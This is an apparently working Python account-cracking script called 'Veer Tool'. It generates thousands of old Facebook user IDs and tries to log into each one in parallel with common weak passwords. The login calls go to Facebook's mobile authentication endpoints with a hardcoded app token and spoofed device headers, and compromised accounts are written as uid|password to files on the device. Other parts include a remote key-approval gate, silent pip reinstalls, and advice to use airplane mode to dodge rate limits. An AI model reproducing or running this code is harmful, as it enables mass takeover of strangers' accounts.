_S='application/x-www-form-urlencoded'
_R='123456789'
_Q='12345678'
_P='1234567'
_O='123456'
_N='Starting process now'
_M='Choose method 1 or 2'
_L='0123456789'
_K='100004'
_J='100003'
_I='1000004'
_H='\x1b[38;5;196m'
_G='\x1b[1;37m'
_F='session_key'
_E='Invalid Method Selected'
_D='STARTING PROCESS'
_C='clear'
_B='2'
_A='1'
import os,re,time,uuid,hashlib,random,string,requests,sys,json,urllib,subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime,timezone,timedelta
def get_pkt_now():'\n    Returns current datetime strictly in Pakistan Standard Time (UTC+5).\n    ';A=timezone(timedelta(hours=5));return datetime.now(A)
def speak(text):
	'\n    Female Voice TTS engine using termux-tts-speak or espeak.\n    '
	try:os.system(f'termux-tts-speak -p 1.5 -r 1.0 "{text}" > /dev/null 2>&1 || espeak -v en-us+f3 "{text}" > /dev/null 2>&1')
	except Exception:0
def get_greeting():
	'\n    Determines greeting based on the current PKT hour accurately.\n    04:00 AM to 11:59 AM -> Good Morning\n    12:00 PM to 04:59 PM -> Good Afternoon\n    05:00 PM to 03:59 AM -> Good Evening / Night\n    ';A=get_pkt_now().hour
	if 4<=A<12:return'Good Morning'
	elif 12<=A<17:return'Good Afternoon'
	else:return'Good Evening'
def show_loading(message='LOADING SYSTEM'):
	'\n    Displays dynamic opening step-by-step loading (10%, 20%, 30%... 100%) with Voice Speak.\n    ';A=message;speak(A);C=['█▒▒▒▒▒▒▒▒▒','██▒▒▒▒▒▒▒▒','███▒▒▒▒▒▒▒','████▒▒▒▒▒▒','█████▒▒▒▒▒','██████▒▒▒▒','███████▒▒▒','████████▒▒','█████████▒','██████████']
	for B in range(10):D=(B+1)*10;sys.stdout.write(f"\r[38;5;51m[{A}] [38;5;46m{C[B]} {D}%[0m");sys.stdout.flush();time.sleep(.15)
	print()
def get_current_datetime():'\n    Returns current formatted PKT date and time.\n    ';return get_pkt_now().strftime('%Y-%m-%d | %I:%M:%S %p PKT')
os.system(_C)
greeting_msg=get_greeting()
print(f"\n[38;5;46m  >>> {greeting_msg.upper()}! INITIALIZING VEER TOOL...[0m\n")
speak(f"{greeting_msg}! Initializing Veer Tool")
time.sleep(1)
show_loading('STARTING VEER TOOL ENGINE')
def approval():
	F='\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m';C=True;os.system(_C);B=get_greeting();show_loading(f"CHECKING APPROVAL - {B.upper()}")
	try:G=subprocess.check_output('getprop ro.product.model',shell=C).decode().strip();H=subprocess.check_output('getprop ro.build.id',shell=C).decode().strip();I=subprocess.check_output('getprop ro.build.display.id',shell=C).decode().strip();D=f"{G}-{H}-{I}"
	except Exception:D='FALLBACK-DEVICE'
	try:E=str(os.getuid())
	except Exception:E='0000'
	J=f"VEER-{D}-{E}";K=hashlib.md5(J.encode('utf-8')).hexdigest()[:12].upper();A=f"VEER-KEY-{K}";L='https://raw.githubusercontent.com/mashooq786/-/refs/heads/main/Approved.txt';print('\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(' \x1b[38;5;46m      ★ SYSTEM APPROVAL REQUIRED ★');print(F);print(f" [38;5;46mYOUR KEY : [1;37m{A}");print(F)
	try:M=requests.get(L).text
	except Exception:print(' \x1b[38;5;196m[!] Internet connection error or approval server down!');speak('Connection Error, Check Your Internet');sys.exit()
	if A in M:print(f" [38;5;46m[✓] APPROVAL SUCCESSFUL! {B.upper()} BOSS!");speak(f"Approval Successful, {B} Boss");time.sleep(1.5)
	else:print(' \x1b[38;5;196m[×] YOUR KEY IS NOT APPROVED YET!');print(' \x1b[38;5;220m[!] Copy key and send on WhatsApp for Approval.');speak('Your Key is Not Approved, Please Contact Admin');os.system(f'echo "{A}" | termux-clipboard-set > /dev/null 2>&1');print(' \x1b[38;5;51m[+] Key copied to clipboard automatically!');speak('Key Copied to Clipboard');input('\n \x1b[38;5;46mPress Enter to contact Admin on WhatsApp...');speak('Redirecting to WhatsApp');os.system(f'xdg-open "https://wa.me/923337398893?text=Hello%20Admin,%20Please%20Approve%20My%20Key:%20{A}"');sys.exit()
approval()
os.system(_C)
current_greet=get_greeting()
print(f"[1;37m\n  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  [38;5;46m   ★ WELCOME TO VEER TOOL - {current_greet.upper()} ★\n  [1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m")
speak(f"{current_greet}, Welcome to Veer Tool")
time.sleep(1)
modules=['requests','urllib3','mechanize','rich','bs4','httpx']
show_loading('CHECKING SYSTEM PACKAGES')
for module in modules:
	try:__import__(module)
	except ImportError:print(f"[38;5;220mInstalling missing package: {module}...[0m");speak(f"Installing missing package {module}");os.system(f"pip install {module}")
from requests.exceptions import ConnectionError
from requests import api,models,sessions
requests.urllib3.disable_warnings()
os.system('pip uninstall requests chardet urllib3 idna certifi -y > /dev/null 2>&1')
os.system('pip install chardet urllib3 idna certifi requests httpx beautifulsoup4 > /dev/null 2>&1')
os.system(_C)
method=[]
oks=[]
cps=[]
loop=0
user=[]
X=_G
rad=_H
G='\x1b[38;5;46m'
Y='\x1b[38;5;220m'
PP='\x1b[38;5;203m'
RR=_H
GS='\x1b[38;5;40m'
W=_G
def windows1():A=str(random.choice(range(10,20)));D=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{A} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{A}";E=str(random.choice(range(1,36)));F=str(random.choice(range(34,38)));B=f"5{F}.{E}";G=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice([_B,_A]))}) AppleWebKit/{B} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{B}";H=str(random.choice(range(1,36)));I=str(random.choice(range(34,38)));C=f"5{I}.{H}";J=f"Mozilla/5.0 (Windows NT 6.{str(random.choice([_B,_A]))}; WOW64) AppleWebKit/{C} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{C}";K=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36";return random.choice([D,G,J,K])
def window1():A=str(random.choice(range(10,20)));D=f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6,11))}.0; en-US) AppleWebKit/534.{A} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.0 Safari/534.{A}";E=str(random.choice(range(1,36)));F=str(random.choice(range(34,38)));B=f"5{F}.{E}";G=f"Mozilla/5.0 (Windows NT {random.choice(range(6,11))}.{random.choice(["0",_A])}) AppleWebKit/{B} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.{random.choice(range(50,200))} Safari/{B}";H=str(random.choice(range(1,36)));I=str(random.choice(range(34,38)));C=f"5{I}.{H}";J=f"Mozilla/5.0 (Windows NT 6.{random.choice(["0",_A,_B])}; WOW64) AppleWebKit/{C} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.{random.choice(range(50,200))} Safari/{C}";K=rr(6000,9000);L=rr(100,200);M=f"Mozilla/5.0 (Windows NT {random.choice(["10.0","11.0"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{K}.{L} Safari/537.36";return random.choice([D,G,J,M])
sys.stdout.write('\x1b]2;𓆩【 Veer 】𓆪 \x07')
def ____banner____():
	if'win'in sys.platform:os.system('cls')
	else:os.system(_C)
	print(f"""[1;37m
██╗   ██╗███████╗███████╗██████╗ 
██║   ██║██╔════╝██╔════╝██╔══██╗
██║   ██║█████╗  █████╗  ██████╔╝
╚██╗ ██╔╝██╔══╝  ██╔══╝  ██╔══██╗
 ╚████╔╝ ███████╗███████╗██║  ██║
  ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝
[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1;37m             ⚡ V E E R ⚡
[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1;37m  DATE & TIME : {get_current_datetime()}
[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m""")
def creationyear(uid):
	A=uid
	if len(A)==15:
		if A.startswith(('1000000000','100000000','1000001','1000002','1000003',_I,'1000005')):return'2009'
		if A.startswith(('1000006','1000007','1000008','1000009','100001')):return'2010'
		if A.startswith(('100002',_J)):return'2011'
		if A.startswith(_K):return'2012'
		if A.startswith(('100005','100006')):return'2013'
		if A.startswith(('100007','100008')):return'2014'
		if A.startswith('100009'):return'2015'
		if A.startswith('10001'):return'2016'
		if A.startswith('10002'):return'2017'
		if A.startswith('10003'):return'2018'
		if A.startswith('10004'):return'2019'
		if A.startswith('10005'):return'2020'
		if A.startswith('10006'):return'2021'
		if A.startswith('10009'):return'2023'
		if A.startswith(('10007','10008')):return'2022'
		return''
	elif len(A)in(9,10):return'2008'
	elif len(A)==8:return'2007'
	elif len(A)==7:return'2006'
	elif len(A)==14 and A.startswith('61'):return'2024'
	else:return''
def clear():os.system(_C)
def linex():print(f"[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m")
def BNG_71_():
	____banner____();speak('Main Menu Option 1: Old Clone Method');print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[01][38;5;46m  OLD CLONE METHOD           │");print(f"[38;5;46m       └──────────────────────────────┘[0m");linex();speak('Please select an option');__Jihad__=input(f"       [38;5;46m➤ SELECT OPTION {W}: {Y}")
	if __Jihad__ in('01',_A):speak('Option One Selected: Old Clone Method');old_clone()
	else:speak('Invalid Choice, Please try again');print(f"\n    {rad}Choose Valid Option... ");time.sleep(2);BNG_71_()
def old_clone():
	____banner____();print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[01][38;5;46m  BEST SERIES FOR TRADERS    │");print(f"[38;5;46m       └──────────────────────────────┘[0m");linex();print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[02][38;5;46m  100003/4 SERIES             │");print(f"[38;5;46m       └──────────────────────────────┘[0m");linex();print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[03][38;5;46m  2009 SERIES                  │");print(f"[38;5;46m       └──────────────────────────────┘[0m");linex();speak('Choose a series option');A=input(f"       [38;5;46m➤ SELECT OPTION {W}: {Y}")
	if A in('01',_A):speak('Selected Best Series Option');old_One()
	elif A in('02',_B):speak('Selected 100003 Series Option');old_Tow()
	elif A in('03','3'):speak('Selected 2009 Series Option');old_Tree()
	else:speak('Invalid Option, try again');print(f"\n[×]{rad} Choose Valid Option... ");time.sleep(2);BNG_71_()
def old_One():
	A=[];____banner____();print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37mOLD CODE : 2010 - 2014       [38;5;46m│");print(f"[38;5;46m       └──────────────────────────────┘[0m");speak('Enter series code');F=input(f"       [38;5;46m➤ SELECT CODE {W}: {G}");linex();____banner____();print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37mEXAMPLE : 20000 / 30000 / 99999 [38;5;46m│");print(f"[38;5;46m       └──────────────────────────────┘[0m");speak('Enter cloning limit');B=input(f"       [38;5;46m➤ ENTER LIMIT {W}: {G}");linex();H='10000'
	for K in range(int(B)):I=str(random.choice(range(1000000000,1999999999 if F==_A else 4999999999)));A.append(I)
	print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[01][38;5;46m METHOD 1                 │");print(f"[38;5;46m       └──────────────────────────────┘");print(f"[38;5;46m       ┌──────────────────────────────┐");print(f"[38;5;46m       │  [1;37m[02][38;5;46m METHOD 2                 │");print(f"[38;5;46m       └──────────────────────────────┘");linex();speak('Select login method');C=input(f"       [38;5;46m➤ CHOOSE METHOD {W}: {Y}").strip().upper();show_loading(_D);speak('Starting cracking session now')
	with tred(max_workers=30)as D:
		____banner____();print(f"       [38;5;46m➤ TOTAL ID : {G}{B}{W}");print(f"       [38;5;46m➤ STATUS   : {G}RUNNING{W}");linex()
		for J in A:
			E=H+J
			if C in(_A,'A'):D.submit(login_1,E)
			elif C in(_B,'B'):D.submit(login_2,E)
			else:speak(_E);print(f"    {rad}[!] INVALID METHOD SELECTED");break
def old_Tow():
	B=[];____banner____();print(f"       [38;5;46mOLD CODE {Y}:{G} 2010-2014");speak('Select code');J=input(f"       [38;5;46mSELECT {Y}:{G} ");linex();____banner____();print(f"       [38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");speak('Enter total ID count');C=input(f"       [38;5;46mSELECT {Y}:{G} ");linex();F=[_J,_K]
	for K in range(int(C)):H=random.choice(F);I=''.join(random.choices(_L,k=9));A=H+I;B.append(A)
	print('       \x1b[38;5;46m(\x1b[1;37m1\x1b[38;5;46m) METHOD 1');print('       \x1b[38;5;46m(\x1b[1;37m2\x1b[38;5;46m) METHOD 2');linex();speak(_M);D=input(f"       [38;5;46mCHOICE {W}(1/2): {Y}").strip().upper();show_loading(_D);speak(_N)
	with tred(max_workers=30)as E:
		____banner____();print(f"       [38;5;46mTOTAL ID COUNT {Y}: {G}{C}{W}");print(f"       [38;5;46mUSE AIRPLANE MODE FOR GOOD RESULTS{G}");linex()
		for A in B:
			if D in(_A,'A'):E.submit(login_1,A)
			elif D in(_B,'B'):E.submit(login_2,A)
			else:speak(_E);print(f"    {rad}[!] INVALID METHOD SELECTED");break
def old_Tree():
	B=[];____banner____();print(f"       [38;5;46m[[1;37m01[38;5;46m] OLD UID [38;5;250m• [38;5;226m2009-2010");speak('Select option');I=input(f"       [38;5;46mSELECT {Y}:{G} ");linex();____banner____();print(f"       [38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");speak('Enter limit count');C=input(f"       [38;5;46mTOTAL ID COUNT {Y}:{G} ");linex();F=_I
	for J in range(int(C)):H=''.join(random.choices(_L,k=8));A=F+H;B.append(A)
	print(f"       [38;5;46m[ 01 ] [1;37mOLD METHOD FAST");print(f"       [38;5;46m[ 02 ] [1;37mOLD METHOD SECURE");linex();speak(_M);D=input(f"       [38;5;46mCHOICE {W}(1/2): {Y}").strip().upper();show_loading(_D);speak(_N)
	with tred(max_workers=30)as E:
		____banner____();print(f"       [38;5;46mTOTAL ID COUNT {Y}: {G}{C}{W}");print(f"       [38;5;46mUSE AIRPLANE MODE FOR GOOD RESULTS{G}");linex()
		for A in B:
			if D==_A:E.submit(login_1,A)
			elif D==_B:E.submit(login_2,A)
			else:speak(_E);print(f"    {rad}[!] INVALID METHOD SELECTED");break
def login_1(uid):
	E='/sdcard/VEER-M1-OK.txt';D='True';A=uid;global loop;F=requests.session()
	try:
		sys.stdout.write(f"\r[38;5;46m[[1;37mVEER[38;5;46m][1;37m [38;5;51mLOOP[1;37m:[38;5;226m {loop} [1;37m❘ [38;5;46mOK[1;37m:[38;5;82m {len(oks)}[0m");sys.stdout.flush()
		for B in(_O,_P,_Q,_R):
			G={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'cpl':'true','family_device_id':str(uuid.uuid4()),'credentials_type':'device_based_login_password','error_detail_type':'button_with_disabled','source':'device_based_login','email':str(A),'password':str(B),'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies':_A,'meta_inf_fbmeta':'','advertiser_id':str(uuid.uuid4()),'currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','method':'auth.login','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d'};H={'User-Agent':window1(),'Content-Type':_S,'Host':'graph.facebook.com','X-FB-Net-HNI':'25227','X-FB-SIM-HNI':'29752','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':D,'X-FB-Server-Cluster':D,'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'};C=F.post('https://b-graph.facebook.com/auth/login',data=G,headers=H,allow_redirects=False).json()
			if _F in C:print(f"\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mAHB[38;5;196m) [1;97m= [38;5;46m{A} [1;97m= [38;5;46m{B} [1;97m= [38;5;45m{creationyear(A)}");open(E,'a').write(f"{A}|{B}\n");oks.append(A);speak(f"Success! OK ID Found: {A}");break
			elif'www.facebook.com'in C.get('error',{}).get('message',''):print(f"\r[38;5;46m✓ [1;37mSUCCESS [38;5;250m• [38;5;46m{A} [38;5;250m• [38;5;226m{B} [38;5;250m• [38;5;208m{creationyear(A)}");print(f"[38;5;51m🔗 PROFILE : https://facebook.com/{A}");open(E,'a').write(f"{A}|{B}\n");oks.append(A);speak(f"Success! OK ID Found: {A}");break
		loop+=1
	except Exception:time.sleep(5)
def login_2(uid):
	D='/sdcard/veer-OLD-M2-OK.txt';A=uid;global loop;sys.stdout.write(f"\r\r[1;37m[38;5;196m+[1;37m[38;5;196m([1;37mAHB-M2[38;5;196m)[1;37m[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m[38;5;196m([1;37mOK[38;5;196m)[1;37m[38;5;196m([38;5;192m{len(oks)}[38;5;196m)")
	for B in(_O,'123123',_P,_Q,_R):
		try:
			with requests.Session()as E:
				F={'x-fb-connection-bandwidth':str(rr(20000000,29999999)),'x-fb-sim-hni':str(rr(20000,40000)),'x-fb-net-hni':str(rr(20000,40000)),'x-fb-connection-quality':'EXCELLENT','x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA','user-agent':window1(),'content-type':_S,'x-fb-http-engine':'Liger'};G=f"https://b-api.facebook.com/method/auth.login?format=json&email={str(A)}&password={str(B)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true";C=E.get(G,headers=F).json()
				if _F in str(C):print(f"\r\r[1;37m[38;5;196m[1;37m<[38;5;196m([1;37mAHB[38;5;196m) [1;97m= [38;5;46m{A} [1;97m= [38;5;46m{B} [1;97m= [38;5;45m{creationyear(A)}");open(D,'a').write(f"{A}|{B}\n");oks.append(A);speak(f"Success! OK ID Found: {A}");break
				elif _F in C:print(f"\r\r[1;37m[38;5;196m[1;37m[38;5;196m([1;37mAHB[38;5;196m) [1;97m= [38;5;46m{A} [1;97m= [38;5;46m{B} [1;97m= [38;5;45m{creationyear(A)}");open(D,'a').write(f"{A}|{B}\n");oks.append(A);speak(f"Success! OK ID Found: {A}");break
		except Exception as H:0
	loop+=1
if __name__=='__main__':BNG_71_()